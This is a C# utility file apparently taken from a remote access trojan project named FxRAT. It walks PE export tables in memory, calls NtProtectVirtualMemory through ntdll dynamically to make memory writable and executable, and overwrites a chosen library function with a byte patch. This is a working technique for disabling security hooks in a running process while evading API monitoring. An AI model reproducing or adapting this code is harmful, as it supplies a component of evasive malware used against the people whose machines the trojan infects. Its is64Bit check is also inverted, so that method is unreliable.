using System.Diagnostics;
using System.Runtime.InteropServices;

namespace FxRAT.Utils;

public class SystUtil
{
    public static bool is64Bit()
    {
        return IntPtr.Size == 4;
    }


    public static void PatchMem(byte[] patch, string library, string function)
    {

        try
        {
            IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
            IntPtr libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
                .Where(x => library.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase))
                .FirstOrDefault().BaseAddress);
            IntPtr funcPtr = ProcessInvoke.GetExportAddress(libPtr, function);
            IntPtr patchLength = new IntPtr(patch.Length);
            UInt32 oldProtect = 0;
            ProcessInvoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchLength, 0x40,
                ref oldProtect);
            Marshal.Copy(patch, 0, funcPtr, patch.Length);
        }
        catch (Exception e)
        {
            Console.WriteLine(" [!] {0}", e.Message);
            Console.WriteLine(" [!] {0}", e.InnerException);
        }
    }
    
        public class ProcessInvoke
    {
        public enum Status : uint
        {
            // Success
            Success = 0x00000000,
        }
        
        public class Delegates
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtProtectVirtualMemory(
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                ref IntPtr RegionSize,
                UInt32 NewProtect,
                ref UInt32 OldProtect);
        }

        private static IntPtr GetLibraryAddress(string DLLName, string FunctionName)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found or not loaded.");
            }
            IntPtr lastOutput = GetExportAddress(hModule, FunctionName);
            return lastOutput;
        }

        private static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            Process CurrentProcess = Process.GetCurrentProcess();
            foreach (ProcessModule Module in CurrentProcess.Modules)
            {
                if (string.Compare(Module.ModuleName, DLLName, true) == 0)
                {
                    IntPtr ModuleBasePointer = Module.BaseAddress;
                    return ModuleBasePointer;
                }
            }
            return IntPtr.Zero;
        }

        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }

        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
        {
            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
            if (pFunction == IntPtr.Zero)
            {
                throw new InvalidOperationException("Could not get the handle for the function.");
            }
            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
        }

        private static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
        {
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }

        public static bool NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect)
        {
            // Craft an array for the arguments
            OldProtect = 0;
            object[] funcargs = { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };

            Status retValue = (Status)DynamicAPIInvoke(@"ntdll.dll", @"NtProtectVirtualMemory", typeof(Delegates.NtProtectVirtualMemory), ref funcargs);
            if (retValue != Status.Success)
            {
                return false;
            }

            OldProtect = (UInt32)funcargs[4];
            return true;
        }
    }
}